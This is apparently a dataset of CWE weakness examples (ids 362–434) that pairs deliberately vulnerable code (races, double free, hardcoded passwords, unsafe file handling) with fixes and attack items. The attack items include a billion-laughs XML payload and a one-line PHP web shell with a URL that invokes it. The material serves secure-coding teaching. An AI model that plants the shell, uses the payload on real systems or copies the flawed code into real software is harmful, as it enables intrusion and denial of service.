LANGUAGE:Java:
                  
public void actionPerformed(ActionEvent e) {
if (e.getSource() == button) {
System.out.println(""print out secret information"");
}
}

               "
362,"
example: 1
NATURE:bad:
LANGUAGE:Perl:
                  
$transfer_amount = GetTransferAmount();
$balance = GetBalanceFromDatabase();

                     
if ($transfer_amount < 0) {
FatalError(""Bad Transfer Amount"");
}
$newbalance = $balance - $transfer_amount;
if (($balance - $transfer_amount) < 0) {
FatalError(""Insufficient Funds"");
}
SendNewBalanceToDatabase($newbalance);
NotifyUser(""Transfer of $transfer_amount succeeded."");
NotifyUser(""New balance: $newbalance"");

               
example: 2
NATURE:attack:
LANGUAGE:Other:
                  
In the following pseudocode, the attacker makes two simultaneous calls of the program, CALLER-1 and CALLER-2. Both callers are for the same user account.
CALLER-1 (the attacker) is associated with PROGRAM-1 (the instance that handles CALLER-1). CALLER-2 is associated with PROGRAM-2.
CALLER-1 makes a transfer request of 80.00.
PROGRAM-1 calls GetBalanceFromDatabase and sets $balance to 100.00
PROGRAM-1 calculates $newbalance as 20.00, then calls SendNewBalanceToDatabase().
Due to high server load, the PROGRAM-1 call to SendNewBalanceToDatabase() encounters a delay.
CALLER-2 makes a transfer request of 1.00.
PROGRAM-2 calls GetBalanceFromDatabase() and sets $balance to 100.00. This happens because the previous PROGRAM-1 request was not processed yet.
PROGRAM-2 determines the new balance as 99.00.
After the initial delay, PROGRAM-1 commits its balance to the database, setting it to 20.00.
PROGRAM-2 sends a request to update the database, setting the balance to 99.00

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
void f(pthread_mutex_t *mutex) {

                        
pthread_mutex_lock(mutex);

                           

                           
/* access shared resource */

                           

                           

                           
pthread_mutex_unlock(mutex);

                     
}

               
example: 4
NATURE:good:
                  
int f(pthread_mutex_t *mutex) {

                        
int result;

                           
result = pthread_mutex_lock(mutex);
if (0 != result)
return result;

                           

                           

                           
/* access shared resource */

                           

                           

                           
return pthread_mutex_unlock(mutex);

                     
}

               "
363,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function readFile($filename){

                        
$user = getCurrentUser();

                           

                           
//resolve file if its a symbolic link

                           
if(is_link($filename)){
$filename = readlink($filename);
}

                           
if(fileowner($filename) == $user){
echo file_get_contents($realFile);
return;
}
else{
echo 'Access denied';
return false;
}

                     
}

               "
364,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char *logMessage;

                     
void handler (int sigNum) {

                        
syslog(LOG_NOTICE, ""%s\n"", logMessage);
free(logMessage);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc, char* argv[]) {

                        
logMessage = strdup(argv[1]);

                           
/* Register signal handlers. */

                           

                           
signal(SIGHUP, handler);
signal(SIGTERM, handler);

                           
/* artificially increase the size of the timing window to make demonstration of this weakness easier. */

                           

                           
sleep(10);

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
#include <signal.h>
#include <syslog.h>
#include <string.h>
#include <stdlib.h>

                     
void *global1, *global2;
char *what;
void sh (int dummy) {

                        
syslog(LOG_NOTICE,""%s\n"",what);
free(global2);
free(global1);

                           
/* Sleep statements added to expand timing window for race condition */

                           

                           
sleep(10);
exit(0);

                     
}

                     
int main (int argc,char* argv[]) {

                        
what=argv[1];
global1=strdup(argv[2]);
global2=malloc(340);
signal(SIGHUP,sh);
signal(SIGTERM,sh);

                           
/* Sleep statements added to expand timing window for race condition */

                           

                           
sleep(10);
exit(0);

                     
}

               "
365,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#include <sys/types.h>
#include <sys/stat.h>
int main(argc,argv){
struct stat *sb;
time_t timer;
lstat(""bar.sh"",sb);
printf(""%d\n"",sb->st_ctime);
switch(sb->st_ctime % 2){
case 0: printf(""One option\n"");
break;
case 1: printf(""another option\n"");
break;
default: printf(""huh\n"");
break;
}
return 0;
}

               "
366,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
int foo = 0;
int storenum(int num) {
static int counter = 0;
counter++;
if (num > foo) foo = num;
return foo;
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public classRace {

                        
static int foo = 0;
public static void main() {

                              

                                 
new Threader().start();
foo = 1;

                           
}
public static class Threader extends Thread {

                              

                                 
public void run() {
System.out.println(foo);
}

                           
}

                     
}

               "
367,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
struct stat *sb;
...
lstat(""..."",sb); // it has not been updated since the last time it was read
printf(""stated file\n"");
if (sb->st_mtimespec==...){
print(""Now updating things\n"");
updateThings();
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
if(!access(file,W_OK)) {
f = fopen(file,""w+"");
operate(f);
...
}
else {

                        

                           
fprintf(stderr,""Unable to open file %s.\n"",file);

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  
function readFile($filename){

                        
$user = getCurrentUser();

                           

                           
//resolve file if its a symbolic link

                           
if(is_link($filename)){
$filename = readlink($filename);
}

                           
if(fileowner($filename) == $user){
echo file_get_contents($realFile);
return;
}
else{
echo 'Access denied';
return false;
}

                     
}

               "
368,
369,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public int computeAverageResponseTime (int totalTime, int numRequests) {
return totalTime / numRequests;
}

               
example: 2
NATURE:good:
                  
public int computeAverageResponseTime (int totalTime, int numRequests) throws ArithmeticException {
if (numRequests == 0) {
System.out.println(""Division by zero attempted!"");
throw ArithmeticException;
}
return totalTime / numRequests;
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
double divide(double x, double y){
return x/y;
}

               
example: 4
NATURE:good:
                  
const int DivideByZero = 10;
double divide(double x, double y){
if ( 0 == y ){
throw DivideByZero;
}
return x/y;
}
...
try{
divide(10, 0);
}
catch( int i ){
if(i==DivideByZero) {
cerr<<""Divide by zero error"";
}
}

               
example: 5
NATURE:bad:
LANGUAGE:C#:
                  
int Division(int x, int y){
return (x / y);
}

               
example: 6
NATURE:good:
                  
int SafeDivision(int x, int y){
try{
return (x / y);
}
catch (System.DivideByZeroException dbz){
System.Console.WriteLine(""Division by zero attempted!"");
return 0;
}
}

               "
370,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (cert = SSL_get_peer_certificate(ssl)) {

                        
foo=SSL_get_verify_result(ssl);
if (X509_V_OK==foo)

                              

                                 

                                 
//do stuff

                                 
foo=SSL_get_verify_result(ssl);

                                 
//do more stuff without the check.

                                 

                              

                           

                        

                     

                  

               "
372,
374,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
private:
int foo;
complexType bar;
String baz;
otherClass externalClass;

                     

                     
public:
void doStuff() {
externalClass.doOtherStuff(foo, bar, baz)
}

                  

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
public class BookStore {

                        
private BookStoreInventory inventory;
private SalesDBManager sales;
...

                           
// constructor for BookStore

                           
public BookStore() {
this.inventory = new BookStoreInventory();
this.sales = new SalesDBManager();
...
}
public void updateSalesAndInventoryForBookSold(String bookISBN) {

                              

                                 

                                 
// Get book object from inventory using ISBN

                                 
Book book = inventory.getBookWithISBN(bookISBN);

                                 
// update sales information for book sold

                                 
sales.updateSalesInformation(book);

                                 
// update inventory

                                 
inventory.updateInventory(book);

                           
}

                           
// other BookStore methods

                           
...

                     
}
public class Book {
private String title;
private String author;
private String isbn;

                        
// Book object constructors and get/set methods

                        
...
}

               
example: 3
NATURE:good:
LANGUAGE:Java:
                  
...
public void updateSalesAndInventoryForBookSold(String bookISBN) {

                        

                           

                           
// Get book object from inventory using ISBN

                           
Book book = inventory.getBookWithISBN(bookISBN);

                           
// Create copy of book object to make sure contents are not changed

                           
Book bookSold = (Book) book.clone();

                           
// update sales information for book sold

                           
sales.updateSalesInformation(bookSold);

                           
// update inventory

                           
inventory.updateInventory(book);

                     
}
...

               "
375,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public class ClinicalTrial {
private PatientClass[] patientList = new PatientClass[50];
public getPatients(...){
return patientList;
}
}

               "
377,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
if (tmpnam_r(filename)) {

                        

                           
FILE* tmp = fopen(filename,""wb+"");
while((recv(sock,recvbuf,DATA_SIZE, 0) > 0)&(amt!=0)) amt = fwrite(recvbuf,1,DATA_SIZE,tmp);

                     
}
...

               "
378,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
FILE *stream;
if( (stream = tmpfile()) == NULL ) {

                        

                           
perror(""Could not open new temporary file\n"");
return (-1);

                     
}

                     
// write data to tmp file

                     
...
// remove tmp file
rmtmp();

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
try {
File temp = File.createTempFile(""pattern"", "".suffix"");
temp.deleteOnExit();
BufferedWriter out = new BufferedWriter(new FileWriter(temp));
out.write(""aString"");
out.close();
}
catch (IOException e) {
}

               "
379,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
FILE *stream;
if( (stream = tmpfile()) == NULL ) {

                        

                           
perror(""Could not open new temporary file\n"");
return (-1);

                     
}

                     
// write data to tmp file

                     
...
// remove tmp file
rmtmp();

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
try {
File temp = File.createTempFile(""pattern"", "".suffix"");
temp.deleteOnExit();
BufferedWriter out = new BufferedWriter(new FileWriter(temp));
out.write(""aString"");
out.close();
}
catch (IOException e) {
}

               "
382,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
Public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
try {
...
} catch (ApplicationSpecificException ase) {
logger.error(""Caught: "" + ase.toString());
System.exit(1);
}
}

               "
383,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                        

                           

                           
// Perform servlet tasks.

                           
...

                           

                           
// Create a new thread to handle background processing.

                           
Runnable r = new Runnable() {

                              
public void run() {

                                    

                                       

                                       
// Process and store request statistics.

                                       
...

                                 
}

                           
};

                           
new Thread(r).start();

                     
}

               "
384,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private void auth(LoginContext lc, HttpSession session) throws LoginException {
...
lc.login();
...
}

               
example: 2
NATURE:bad:
LANGUAGE:HTML:
                  
<form method=""POST"" action=""j_security_check"">
<input type=""text"" name=""j_username"">
<input type=""text"" name=""j_password"">
</form>

               "
385,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
def validate_password(actual_pw, typed_pw):

                        
if len(actual_pw) <> len(typed_pw):
return 0

                           
for i in len(actual_pw):
if actual_pw[i] <> typed_pw[i]:
return 0

                           

                           
return 1

                     

                  

               "
386,
390,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
foo=malloc(sizeof(char)); //the next line checks to see if malloc failed
if (foo==NULL) {
//We do nothing so we just ignore the error.
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
foo=malloc(sizeof(char)); //the next line checks to see if malloc failed
if (foo==NULL) {
printf(""Malloc failed to allocate memory resources"");
return -1;
}

               
example: 3
NATURE:bad:
LANGUAGE:C++:
                  
char* readfile (char *filename) {

                        
try {

                              
// open input file
ifstream infile;
infile.open(filename);

                                 
if (!infile.is_open()) {
throw ""Unable to open file "" + filename;
}

                                 
// get length of file
infile.seekg (0, ios::end);
int length = infile.tellg();
infile.seekg (0, ios::beg);

                                 
// allocate memory
char *buffer = new char [length];

                                 
// read data from file
infile.read (buffer,length);

                                 
if (!infile.good()) {
throw ""Unable to read from file "" + filename;
}

                                 
infile.close();

                                 
return buffer;

                           
}
catch (...) {
/* bug: insert code to handle this later */
}

                     
}

               
example: 4
NATURE:good:
LANGUAGE:C++:
                  
char* readFile (char *filename) {

                        
try {

                              
// open input file
ifstream infile;
infile.open(filename);

                                 
if (!infile.is_open()) {
throw ""Unable to open file "" + filename;
}

                                 
// get length of file
infile.seekg (0, ios::end);
int length = infile.tellg();
infile.seekg (0, ios::beg);

                                 
// allocate memory
char *buffer = new char [length];

                                 
// read data from file
infile.read (buffer,length);

                                 
if (!infile.good()) {
throw ""Unable to read from file "" + filename;
}
infile.close();

                                 
return buffer;

                           
}
catch (char *str) {
printf(""Error: %s \n"", str);
infile.close();
throw str;
}
catch (...) {
printf(""Error occurred trying to read from file \n"");
infile.close();
throw;
}

                     
}

               
example: 5
NATURE:bad:
LANGUAGE:Java:
                  
public String readFile(String filename) {

                        
String retString = null;
try {

                              
// initialize File and FileReader objects
File file = new File(filename);
FileReader fr = new FileReader(file);

                                 
// initialize character buffer
long fLen = file.length();
char[] cBuf = new char[(int) fLen];

                                 
// read data from file
int iRead = fr.read(cBuf, 0, (int) fLen);

                                 
// close file
fr.close();

                                 
retString = new String(cBuf);

                              

                           
} catch (Exception ex) {
/* do nothing, but catch so it'll compile... */
}
return retString;

                     
}

               
example: 6
NATURE:good:
LANGUAGE:Java:
                  
public String readFile(String filename) throws FileNotFoundException, IOException, Exception {

                        
String retString = null;
try {

                              
// initialize File and FileReader objects
File file = new File(filename);
FileReader fr = new FileReader(file);

                                 
// initialize character buffer
long fLen = file.length();
char [] cBuf = new char[(int) fLen];

                                 
// read data from file
int iRead = fr.read(cBuf, 0, (int) fLen);

                                 
// close file
fr.close();

                                 
retString = new String(cBuf);

                              

                           
} catch (FileNotFoundException ex) {
System.err.println (""Error: FileNotFoundException opening the input file: "" + filename );
System.err.println ("""" + ex.getMessage() );
throw new FileNotFoundException(ex.getMessage());
} catch (IOException ex) {
System.err.println(""Error: IOException reading the input file.\n"" + ex.getMessage() );
throw new IOException(ex);
} catch (Exception ex) {
System.err.println(""Error: Exception reading the input file.\n"" + ex.getMessage() );
throw new Exception(ex);
}
return retString;

                     
}

               "
391,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
doExchange();
}
catch (RareException e) {

                        

                           

                           
// this can never happen

                           

                        

                     
}

               "
392,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {

                        

                           

                           
// Something that may throw an exception.

                           
...

                     
} catch (Throwable t) {
logger.error(""Caught: "" + t.toString());
return;
}

               "
393,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {

                        

                           

                           
// something that might throw IOException

                           
...

                     
} catch (IOException ioe) {
response.sendError(SC_NOT_FOUND);
}

               "
394,
395,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
try {
mysteryMethod();
} catch (NullPointerException npe) {

                        

                     
}

               "
396,"
example: 1
NATURE:good:
LANGUAGE:Java:
                  
try {
doExchange();
}
catch (IOException e) {
logger.error(""doExchange failed"", e);
}
catch (InvocationTargetException e) {

                        

                           
logger.error(""doExchange failed"", e);

                     
}
catch (SQLException e) {

                        

                           
logger.error(""doExchange failed"", e);

                     
}

               
example: 2
NATURE:bad:
                  
try {
doExchange();
}
catch (Exception e) {
logger.error(""doExchange failed"", e);
}

               "
397,"
example: 1
NATURE:good:
LANGUAGE:Java:
                  
public void doExchange() throws IOException, InvocationTargetException, SQLException {
...
}

               
example: 2
NATURE:bad:
                  
public void doExchange() throws Exception {
...
}

               
example: 3
NATURE:bad:
                  
int myfunction() throw(std::exception) {
if (0) throw out_of_range();
throw length_error();
}

               "
400,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
class Worker implements Executor {

                        
...
public void execute(Runnable r) {

                              

                                 
try {
...
}
catch (InterruptedException ie) {

                                    

                                       

                                       
// postpone response

                                       
Thread.currentThread().interrupt();

                                 
}

                           
}

                           
public Worker(Channel ch, int nworkers) {
...
}

                           
protected void activate() {

                              

                                 
Runnable loop = new Runnable() {

                                    

                                       
public void run() {

                                          

                                             
try {
for (;;) {
Runnable r = ...;
r.run();
}
}
catch (InterruptedException ie) {
...
}

                                       
}

                                 
};
new Thread(loop).start();

                           
}

                     
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
sock=socket(AF_INET, SOCK_STREAM, 0);
while (1) {
newsock=accept(sock, ...);
printf(""A connection has been accepted\n"");
pid = fork();
}

               
example: 3
NATURE:bad:
LANGUAGE:C:
                  
int writeDataFromSocketToFile(char *host, int port)
{

                        

                           
char filename[FILENAME_SIZE];
char buffer[BUFFER_SIZE];
int socket = openSocketConnection(host, port);

                           
if (socket < 0) {
printf(""Unable to open socket connection"");
return(FAIL);
}
if (getNextMessage(socket, filename, FILENAME_SIZE) > 0) {

                              
if (openFileToWrite(filename) > 0) {

                                    
while (getNextMessage(socket, buffer, BUFFER_SIZE) > 0){
if (!(writeToFile(buffer) > 0))
break;

                                       
}

                                 
}
closeFile();

                           
}
closeSocket(socket);

                     
}

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  

                     

                     
/* process message accepts a two-dimensional character array of the form [length][body] containing the message to be processed */

                     
int processMessage(char **message)
{

                        
char *body;

                           
int length = getMessageLength(message[0]);

                           
if (length > 0) {
body = &message[1][0];
processMessageBody(body);
return(SUCCESS);
}
else {
printf(""Unable to process message; invalid message length"");
return(FAIL);
}

                     
}

               
example: 5
NATURE:good:
LANGUAGE:C:
                  
unsigned int length = getMessageLength(message[0]);
if ((length > 0) && (length < MAX_LENGTH)) {...}

               
example: 6
NATURE:bad:
LANGUAGE:Java:
                  
public void acceptConnections() {

                     

                        
try {
ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
int counter = 0;
boolean hasConnections = true;
while (hasConnections) {
Socket client = serverSocket.accept();
Thread t = new Thread(new ClientSocketThread(client));
t.setName(client.getInetAddress().getHostName() + "":"" + counter++);
t.start();
}
serverSocket.close();

                           

                           
} catch (IOException ex) {...}

                     
}

               
example: 7
NATURE:good:
LANGUAGE:Java:
                  
public static final int SERVER_PORT = 4444;
public static final int MAX_CONNECTIONS = 10;
...

                     
public void acceptConnections() {

                     

                        
try {
ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
int counter = 0;
boolean hasConnections = true;
while (hasConnections) {
hasConnections = checkForMoreConnections();
Socket client = serverSocket.accept();
Thread t = new Thread(new ClientSocketThread(client));
t.setName(client.getInetAddress().getHostName() + "":"" + counter++);
ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);
pool.execute(t);
}
serverSocket.close();

                           

                           
} catch (IOException ex) {...}

                     
}

               "
401,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* getBlock(int fd) {

                        
char* buf = (char*) malloc(BLOCK_SIZE);
if (!buf) {
return NULL;
}
if (read(fd, buf, BLOCK_SIZE) != BLOCK_SIZE) {

                              

                                 
return NULL;

                           
}
return buf;

                     
}

               "
402,
403,
404,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
private void processFile(string fName) {
StreamWriter sw = new StreamWriter(fName);
string line;
while ((line = sr.ReadLine()) != null){
processLine(line);
}
}

               
example: 2
NATURE:bad:
LANGUAGE:Java:
                  
try {
Connection con = DriverManager.getConnection(some_connection_string);
}
catch ( Exception e ) {
log( e );
}

               
example: 3
NATURE:bad:
LANGUAGE:C#:
                  
...
SqlConnection conn = new SqlConnection(connString);
SqlCommand cmd = new SqlCommand(queryString);
cmd.Connection = conn;
conn.Open();
SqlDataReader rdr = cmd.ExecuteReader();
HarvestResults(rdr);
conn.Connection.Close();
...

               
example: 4
NATURE:bad:
LANGUAGE:C:
                  
int decodeFile(char* fName) {

                        
char buf[BUF_SZ];
FILE* f = fopen(fName, ""r"");
if (!f) {
printf(""cannot open %s\n"", fName);
return DECODE_FAIL;
}
else {

                              
while (fgets(buf, BUF_SZ, f)) {
if (!checkChecksum(buf)) {
return DECODE_FAIL;
}
else {
decodeBlock(buf);
}
}

                           
}
fclose(f);
return DECODE_SUCCESS;

                     
}

               
example: 5
NATURE:bad:
LANGUAGE:C++:
                  
class A {
void foo();
};
void A::foo(){
int *ptr;
ptr = (int*)malloc(sizeof(int));
delete ptr;
}

               
example: 6
NATURE:bad:
LANGUAGE:C++:
                  
class A{
void foo(bool);
};
void A::foo(bool heap) {
int localArray[2] = {
11,22
};
int *p = localArray;
if (heap){
p = new int[2];
}
delete[] p;
}

               "
405,
406,"
example: 1
NATURE:bad:
LANGUAGE:Python:
                  
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind( (UDP_IP,UDP_PORT) )
while true:

                        
data = sock.recvfrom(1024)
if not data:
break

                           
(requestIP, nameToResolve) = parseUDPpacket(data)
record = resolveName(nameToResolve)
sendResponse(requestIP,record)

                     

                  

               "
407,
408,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function printFile($username,$filename){

                        

                           

                           
//read file into string

                           
$file = file_get_contents($filename);
if ($file && isOwnerOf($username,$filename)){
echo $file;
return true;
}
else{
echo 'You are not authorized to view this file';
}
return false;

                     
}

               "
409,"
example: 1
NATURE:attack:
LANGUAGE:XML:
                  
<?xml version=""1.0""?>
<!DOCTYPE MaliciousDTD [
<!ENTITY ZERO ""A"">
<!ENTITY ONE ""&ZERO;&ZERO;"">
<!ENTITY TWO ""&ONE;&ONE;"">
...
<!ENTITY THIRTYTWO ""&THIRTYONE;&THIRTYONE;"">
]>
<data>&THIRTYTWO;</data>

               "
410,"
example: 1
NATURE:bad:
LANGUAGE:XML:
                  
<Resource name=""jdbc/exampledb""
auth=""Container""
type=""javax.sql.DataSource""
removeAbandoned=""true""
removeAbandonedTimeout=""30""
maxActive=""5""
maxIdle=""5""
maxWait=""60000""
username=""testuser""
password=""testpass""
driverClassName=""com.mysql.jdbc.Driver""
url=""jdbc:mysql://localhost/exampledb""/>

               "
412,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
function writeToLog($message){
$logfile = fopen(""logFile.log"", ""a"");

                        
//attempt to get logfile lock

                        
if (flock($logfile, LOCK_EX)) {
fwrite($logfile,$message);

                           
// unlock logfile

                           
flock($logfile, LOCK_UN);
}
else {
print ""Could not obtain lock on logFile.log, message not recorded\n"";
}
}
fclose($logFile);

               "
413,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
void f(pthread_mutex_t *mutex) {

                        
pthread_mutex_lock(mutex);

                           

                           
/* access shared resource */

                           

                           

                           
pthread_mutex_unlock(mutex);

                     
}

               
example: 2
NATURE:good:
LANGUAGE:C:
                  
int f(pthread_mutex_t *mutex) {

                        
int result;

                           
result = pthread_mutex_lock(mutex);
if (0 != result)
return result;

                           

                           

                           
/* access shared resource */

                           

                           

                           
return pthread_mutex_unlock(mutex);

                     
}

               
example: 3
NATURE:bad:
LANGUAGE:Java:
                  
public class BankAccount {

                        

                           

                           
// variable for bank account balance

                           
private double accountBalance;

                           

                           
// constructor for BankAccount

                           
public BankAccount() {
accountBalance = 0;
}

                           

                           
// method to deposit amount into BankAccount

                           
public void deposit(double depositAmount) {

                              

                                 
double newBalance = accountBalance + depositAmount;
accountBalance = newBalance;

                           
}

                           

                           
// method to withdraw amount from BankAccount

                           
public void withdraw(double withdrawAmount) {

                              

                                 
double newBalance = accountBalance - withdrawAmount;
accountBalance = newBalance;

                           
}

                           

                           
// other methods for accessing the BankAccount object

                           
...

                     
}

               
example: 4
NATURE:good:
LANGUAGE:Java:
                  
public class BankAccount {

                        
...

                           
// synchronized method to deposit amount into BankAccount

                           
public synchronized void deposit(double depositAmount) {
...
}

                           

                           
// synchronized method to withdraw amount from BankAccount

                           
public synchronized void withdraw(double withdrawAmount) {
...
}

                           
...

                     
}

               
example: 5
NATURE:good:
LANGUAGE:Java:
                  
public class BankAccount {

                        
...

                           
// lock object for thread access to methods

                           
private ReentrantLock balanceChangeLock;

                           

                           
// condition object to temporarily release lock to other threads

                           
private Condition sufficientFundsCondition;

                           

                           
// method to deposit amount into BankAccount

                           
public void deposit(double amount) {

                              

                                 

                                 
// set lock to block access to BankAccount from other threads

                                 
balanceChangeLock.lock();
try {

                                    
double newBalance = balance + amount;
balance = newBalance;

                                       

                                       
// inform other threads that funds are available

                                       
sufficientFundsCondition.signalAll();

                                    

                                 
} catch (Exception e) {...}
finally {
// unlock lock object
balanceChangeLock.unlock();
}

                           
}

                           

                           
// method to withdraw amount from bank account

                           
public void withdraw(double amount) {

                              

                                 

                                 
// set lock to block access to BankAccount from other threads

                                 
balanceChangeLock.lock();
try {

                                    
while (balance < amount) {

                                          

                                             

                                             
// temporarily unblock access

                                             

                                             

                                             
// until sufficient funds are available

                                             
sufficientFundsCondition.await();

                                       
}
double newBalance = balance - amount;
balance = newBalance;

                                    

                                 
} catch (Exception e) {...}
finally {
// unlock lock object
balanceChangeLock.unlock();
}

                           
}
...

                     
}

               "
414,
415,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
...
if (abrt) {
free(ptr);
}
...
free(ptr);

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <unistd.h>
#define BUFSIZE1 512
#define BUFSIZE2 ((BUFSIZE1/2) - 8)

                     
int main(int argc, char **argv) {
char *buf1R1;
char *buf2R1;
char *buf1R2;
buf1R1 = (char *) malloc(BUFSIZE2);
buf2R1 = (char *) malloc(BUFSIZE2);
free(buf1R1);
free(buf2R1);
buf1R2 = (char *) malloc(BUFSIZE1);
strncpy(buf1R2, argv[1], BUFSIZE1-1);
free(buf2R1);
free(buf1R2);
}

               "
416,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#include <stdio.h>
#include <unistd.h>
#define BUFSIZER1 512
#define BUFSIZER2 ((BUFSIZER1/2) - 8)
int main(int argc, char **argv) {
char *buf1R1;
char *buf2R1;
char *buf2R2;
char *buf3R2;
buf1R1 = (char *) malloc(BUFSIZER1);
buf2R1 = (char *) malloc(BUFSIZER1);
free(buf2R1);
buf2R2 = (char *) malloc(BUFSIZER2);
buf3R2 = (char *) malloc(BUFSIZER2);
strncpy(buf2R1, argv[1], BUFSIZER1-1);
free(buf1R1);
free(buf2R2);
free(buf3R2);
}

               
example: 2
NATURE:bad:
LANGUAGE:C:
                  
char* ptr = (char*)malloc (SIZE);
if (err) {
abrt = 1;
free(ptr);
}
...
if (abrt) {
logError(""operation aborted before commit"", ptr);
}

               "
419,
420,
421,
422,
424,
425,"
example: 1
NATURE:attack:
LANGUAGE:JSP:
                  
http://somesite.com/someapplication/admin.jsp

               "
426,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
#define DIR ""/restricted/directory""

                     
char cmd[500];
sprintf(cmd, ""ls -l %480s"", DIR);

                     
/* Raise privileges to those needed for accessing DIR. */

                     

                     
RaisePrivileges(...);
system(cmd);
DropPrivileges(...);
...

               
example: 2
NATURE:attack:
                  

                     
The user sets the PATH to reference a directory under the attacker's control, such as ""/my/dir/"".

                     
The attacker creates a malicious program called ""ls"", and puts that program in /my/dir

                     
The user executes the program.

                     
When system() is executed, the shell consults the PATH to find the ls program

                     
The program finds the attacker's malicious program, ""/my/dir/ls"". It doesn't find ""/bin/ls"" because PATH does not contain ""/bin/"".

                     
The program executes the attacker's malicious program with the raised privileges.

                  

               
example: 3
NATURE:bad:
LANGUAGE:PHP:
                  

                     

                     
//assume getCurrentUser() returns a username that is guaranteed to be alphanumeric (CWE-78)

                     
$userName = getCurrentUser();
$command = 'ps aux | grep ' . $userName;
system($command);

               
example: 4
NATURE:bad:
LANGUAGE:Java:
                  
...
System.Runtime.getRuntime().exec(""make"");
...

               "
427,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
...
System.Runtime.getRuntime().exec(""make"");
...

               "
428,"
example: 1
NATURE:bad:
LANGUAGE:C:
                  
UINT errCode = WinExec( ""C:\\Program Files\\Foo\\Bar"", SW_SHOW );

               "
430,
431,"
example: 1
NATURE:bad:
LANGUAGE:Java:
                  
protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {
String ip = req.getRemoteAddr();
InetAddress addr = InetAddress.getByName(ip);
...
out.println(""hello "" + addr.getHostName());
}

               "
432,
433,"
example: 1
NATURE:bad:
LANGUAGE:PHP:
                  
<?php
$dbName = 'usersDB';
$dbPassword = 'skjdh#67nkjd3$3$';
?>

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  
<?php
include('database.inc');
$db = connectToDB($dbName, $dbPassword);
$db.authenticateUser($username, $password);
?>

               "
434,"
example: 1
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""upload_picture.php"" method=""post"" enctype=""multipart/form-data"">

                     
Choose a file to upload:
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 2
NATURE:bad:
LANGUAGE:PHP:
                  

                     

                     
// Define the target location where the picture being

                     

                     

                     
// uploaded is going to be saved.

                     
$target = ""pictures/"" . basename($_FILES['uploadedfile']['name']);

                     

                     
// Move the uploaded file to the new location.

                     
if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target))
{
echo ""The picture has been successfully uploaded."";
}
else
{
echo ""There was an error uploading the picture, please try again."";
}

               
example: 3
NATURE:attack:
                  
malicious.php

               
example: 4
NATURE:attack:
LANGUAGE:PHP:
                  
<?php
system($_GET['cmd']);

                     
?>

               
example: 5
NATURE:attack:
                  
http://server.example.com/upload_dir/malicious.php?cmd=ls%20-l

               
example: 6
NATURE:good:
LANGUAGE:HTML:
                  
<form action=""FileUploadServlet"" method=""post"" enctype=""multipart/form-data"">

                     
Choose a file to upload:
<input type=""file"" name=""filename""/>
<br/>
<input type=""submit"" name=""submit"" value=""Submit""/>

                     
</form>

               
example: 7
NATURE:bad:
LANGUAGE:Java:
                  
public class FileUploadServlet extends HttpServlet {

                     

                        
...

                           
protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

                           

                              
response.setContentType(""text/html"");
PrintWriter out = response.getWriter();
String contentType = request.getContentType();

                                 
// the starting position of the boundary header
int ind = contentType.indexOf(""boundary="");
String boundary = contentType.substring(ind+9);

                                 
String pLine = new String();
String uploadLocation = new String(UPLOAD_DIRECTORY_STRING); //Constant value

                                 
